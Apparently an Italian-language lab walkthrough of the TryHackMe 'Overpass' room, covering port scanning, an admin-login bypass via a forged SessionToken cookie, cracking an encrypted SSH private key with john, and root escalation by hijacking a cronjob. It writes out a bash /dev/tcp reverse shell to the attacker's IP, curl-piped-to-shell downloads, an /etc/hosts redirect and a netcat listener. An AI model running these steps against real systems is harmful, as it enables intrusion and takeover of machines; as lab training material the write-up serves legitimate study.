
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/overpass

```
sudo nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.129.108 -oG risultatoscan 
```

```
 cat risultatoscan
```

```
sudo nmap -sC -sV -p22,80 10.10.129.108 -oN risultatoscan2
```

```
searchsploit OpenSSH
```

```
gobuster dir -u http://10.10.129.108 -w /usr/share/wordlists/dirb/common.txt -t50
```


http://10.10.129.108/admin/
visualizziamo codice sorgente

view page source
troviamo riferimento a login.js
```
<script src="[/login.js](view-source:http://10.10.129.108/login.js)"></script>
```

```
if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
```
c'è una condizione if se lo stato dei Cookie riporta "SessionToken" ci logghiamocome admin

andiamo su storage cookie facciamo + e rinominiamo il cookie con SessionToken
aggiorniamo pagina e siamo dentro come admin!

troviamo utente james:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```

```
nano id_rsa
```
ci copiamo la chiave
```
ssh -i id_rsa james@10.10.179.100
```
ci richiede una password che non abbiamo!

==trasformiamo la chiave rsa in hash e la andiamo a decriptare sempre con john==
```
ssh2john id_rsa > id_rsa.hash
```

```
cat id_rsa.hash
```

```
john -wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

```
john --show id_rsa.hash
```
trovata password!
```
james13
```

```
ssh -i id_rsa james@10.10.179.100
```

da errore di permessi  del file id_rsa

```
sudo chmod 600 id_rsa
```
ci riconnettiamo e inseriamo la password trovata

```
ssh -i id_rsa james@10.10.6.110
```

```
cat user.txt
```
prima flag!
```
thm{65c1aaf000506e56996822c6281e6bf7}
```


```
find / -perm -4000 -ls 2>/dev/null
```
prima di Suid andiamo a vedere su che binario abbiamo i permessi di root
```
sudo -l
```

non troviamo niente di utile cerchiamo nel ==crontab==

```
cat /etc/crontab
```
troviamo un curl utilizzato come root su questo percorso che finisce in un bash script
```
root curl overpass.thm/downloads/src/buildscript.sh | bash
```
	overpass.thm (punta al localhost come vediamo in seguito)
```
cat /etc/hosts
```
127.0.0.1 overpass.thm

invece di farlo puntare al localhost lo facciamo puntare alla nostra macchina 
dove ci tiriamo su un server con python e una reverse shell allo script buildscript.sh

Per trovare facilmente come scalare i privilegi possiamo utilizzare linpeas [[linPEAS_info]]
https://book.hacktricks.xyz/linux-hardening/privilege-escalation
che trova automaticamente i vettori di escalation dei privilegi. 

eseguito direttamente da  github 
```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
senza curl scaricato in locale (utilizziamo questo metodo)

```
python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
```

```
chmod +x linpeas.sh
```

dal pc attaccante apriamo un server python
```
sudo python3 -m http.server 8080 #Host
```
dalla vittima  facciamo puntare al nostro IP al tools linpeas
```
curl 10.21.9.220:8080/linpeas.sh | sh 
```


Guardando l'output dei linpeas

Scopriamo che c'è un cronjob in esecuzione ogni minuto

Che esegue curl

* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

Ciò che rende il cronjob ancora più interessante è che viene eseguito come root, il che significa che se lo sfruttiamo saremo root.

Ma diamo uno sguardo più da vicino al comando eseguito

curl overpass.thm/downloads/src/buildscript.sh | bash

Ci scarichiamo dal webserver la risorsa trovata
http://10.10.179.100/downloads/src/buildscript.sh

ora dobbiamo ricrearci su nostro pc il percorso preciso della risorsa downloads/src/buildscript.sh

```
cd /home/kali/Downloads/
```

```
mkdir downloads
```

```
cd downloads
```

```
mkdir src
```

```
cd /home/kali/Downloads
```

```
mv buildscript.sh downloads/src
```

```
nano downloads/src/buildscript.sh
```
aggiungiamo all'inizio con il nostro IP porta 4444
```
bash -i >& /dev/tcp/10.21.9.220/4444 0>&1
```
gli diamo i permessi di esecuzione
```
chmod +x downloads/src/buildscript.sh
```
ora sulla macchina vittima 
```
nano /etc/hosts
```
e modifichiamo IP con il nostro 127.0.0.1 overpass.thm
```
10.21.9.220 overpass.thm
```

dal pc attaccante apriamo un server python
```
cd /home/kali/Downloads
```

```
sudo python3 -m http.server 80
```
ci mettiamo in ascolto con netcat e attendiamo come abbiamo visto da cron tab che passi un minuto che si connetta
```
nc -nlvp 4444
```
ottenuta la reverse shell
```
cat root.txt
```

```
thm{xxxxxxxxxxxxxxxxxx}
```

